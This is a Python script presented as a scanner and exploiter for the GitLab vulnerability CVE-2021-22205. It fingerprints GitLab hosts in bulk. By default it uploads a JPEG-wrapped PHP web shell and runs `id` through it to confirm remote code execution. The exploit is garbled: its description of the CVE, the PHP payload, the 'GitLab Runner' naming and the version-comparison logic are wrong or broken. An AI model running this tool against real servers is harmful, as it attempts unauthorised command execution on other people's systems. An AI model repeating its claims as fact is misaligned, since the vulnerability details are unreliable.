#!/usr/bin/env python3
"""
GitLab Runner CVE-2021-22205 Scanner
=====================================
This is a vulnerability scanner to detect and exploit the remote code execution (RCE)
vulnerability in GitLab Runner due to improper validation of user-supplied images 
(CVE-2021-22205, CVSS 10.0).

CVE-2021-22205 details:
  - Affects GitLab CE/EE versions < 13.10.3, 13.9.6, and 13.8.8
  - Vulnerability caused by an unauthenticated path allowing attackers to upload
    specially crafted image files that execute arbitrary commands.
  - This is a critical flaw that allows unauthenticated attackers full system compromise.

This tool checks if a GitLab instance is vulnerable and optionally attempts to exploit
the issue for validation purposes. Note that active exploitation requires consent!

Dependencies:
  - `httpx` (for asynchronous HTTP requests)
  - Python 3.10+ required

Usage:
  # Scan a single target for the vulnerability
  python gitlab_runner_rce_scanner.py --target https://example.gitlab.com

  # Scan multiple targets from a file
  python gitlab_runner_rce_scanner.py --list targets.txt --output findings.json

  # Safe mode: only detection, no active RCE probing
  python gitlab_runner_rce_scanner.py --list targets.txt --safe

  # Customize concurrency for bulk scanning
  python gitlab_runner_rce_scanner.py --list targets.txt --concurrency 50

References:
  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22205
  - https://gitlab.com/gitlab-org/cves/-/blob/master/2021/CVE-2021-22205.json
"""

import asyncio
import argparse
import httpx
import json
import re
import sys
import os
from urllib.parse import urljoin

# Constants
GITLAB_FINGERPRINTS = [
    "GitLab",
    "<title>GitLab</title>",
    "gitlab-workhorse",
]

VULN_FIXED_VERSIONS = [
    (13, 10, 3),
    (13, 9, 6),
    (13, 8, 8),
]

SEMAPHORE_LIMIT = 30
REQUEST_TIMEOUT = 8
TEST_FILE_NAME = "testfile.jpg"
RCE_PROBE_PAYLOAD = (
    b"\xff\xd8\xff\xfe\x00\x24<?php system($_GET['cmd']); ?>"
)  # Embedded PHP code
RCE_VERIFY_CMD = "id"  # Command to execute for RCE verification

# Helper Functions
def parse_version(version_string):
    """Parse version string into tuple (major, minor, patch)."""
    try:
        return tuple(map(int, version_string.split(".")))
    except Exception:
        return None

def is_vulnerable(version_string):
    """Determine if the extracted GitLab version is vulnerable."""
    parsed_version = parse_version(version_string)
    if not parsed_version:
        return None
    return parsed_version < max(VULN_FIXED_VERSIONS)

def normalize_url(url):
    """Ensure the URL contains a scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")

async def detect_gitlab(client, base_url, semaphore):
    """Check if a target is running GitLab."""
    async with semaphore:
        try:
            response = await client.get(base_url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                for fingerprint in GITLAB_FINGERPRINTS:
                    if fingerprint in response.text:
                        return True
        except Exception:
            pass
    return False

async def extract_version(client, base_url, semaphore):
    """Attempt to extract the GitLab version from the target."""
    async with semaphore:
        try:
            response = await client.get(base_url, timeout=REQUEST_TIMEOUT)
            match = re.search(r"GitLab\s(\d+\.\d+\.\d+)", response.text, re.IGNORECASE)
            if match:
                return match.group(1)
        except Exception:
            pass
    return None

async def check_rce(client, base_url, semaphore, verify):
    """Perform RCE check using a crafted file upload."""
    upload_url = urljoin(base_url, "/users")
    async with semaphore:
        try:
            multipart_data = {
                "file": (TEST_FILE_NAME, RCE_PROBE_PAYLOAD, "image/jpeg"),
            }
            response = await client.post(
                upload_url, files=multipart_data, timeout=REQUEST_TIMEOUT
            )
            if verify:
                verify_url = urljoin(base_url, "uploads/" + TEST_FILE_NAME + "?cmd=" + RCE_VERIFY_CMD)
                verify_resp = await client.get(verify_url, timeout=REQUEST_TIMEOUT)
                if "uid=" in verify_resp.text:
                    return True
        except Exception:
            pass
    return False

async def scan_target(client, url, semaphore, safe_mode, verify):
    """Main scan logic for a single target."""
    url = normalize_url(url)
    print(f"[INFO] Scanning {url}")
    result = {
        "url": url,
        "vulnerable": False,
        "version": None,
        "rce_exploitable": None,
    }
    if not await detect_gitlab(client, url, semaphore):
        print("\033[31m[INFO] Target does not appear to be running GitLab.\033[0m")
        return result

    print("\033[33m[INFO] GitLab detected on target.\033[0m")
    version = await extract_version(client, url, semaphore)
    if version:
        print(f"\033[33m[INFO] Detected GitLab version: {version}\033[0m")
        result["version"] = version
        vulnerable = is_vulnerable(version)
        if vulnerable:
            result["vulnerable"] = True
            print("\033[31m[CRITICAL] Target is running a vulnerable version.\033[0m")
            if not safe_mode:
                exploitable = await check_rce(client, url, semaphore, verify)
                result["rce_exploitable"] = exploitable
                if exploitable:
                    print("\033[31m[CRITICAL] Remote code execution is possible!\033[0m")
                else:
                    print("\033[33m[HIGH] Target is vulnerable, but RCE validation failed.\033[0m")
        else:
            print("\033[32m[INFO] Target is running a patched version.\033[0m")
    else:
        print("\033[33m[INFO] Could not determine version.\033[0m")
    return result

# Main logic for argument parsing and execution
async def main(args):
    if args.list:
        with open(args.list, "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    elif args.target:
        targets = [args.target]
    else:
        print("\033[31m[ERROR] You must provide either --target or --list.\033[0m")
        sys.exit(1)

    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        tasks = [
            scan_target(client, target, semaphore, args.safe, not args.no_verify)
            for target in targets
        ]
        results = await asyncio.gather(*tasks)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
        print(f"\033[32m[INFO] Results saved to {args.output}.\033[0m")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GitLab Runner CVE-2021-22205 Scanner")
    parser.add_argument("--target", help="Target GitLab instance URL")
    parser.add_argument("--list", help="File containing list of target URLs")
    parser.add_argument("--output", help="Save results to JSON file")
    parser.add_argument("--safe", action="store_true", help="Safe mode: detection only")
    parser.add_argument("--concurrency", type=int, default=30, help="Number of concurrent scans (default: 30)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    args = parser.parse_args()

    asyncio.run(main(args))
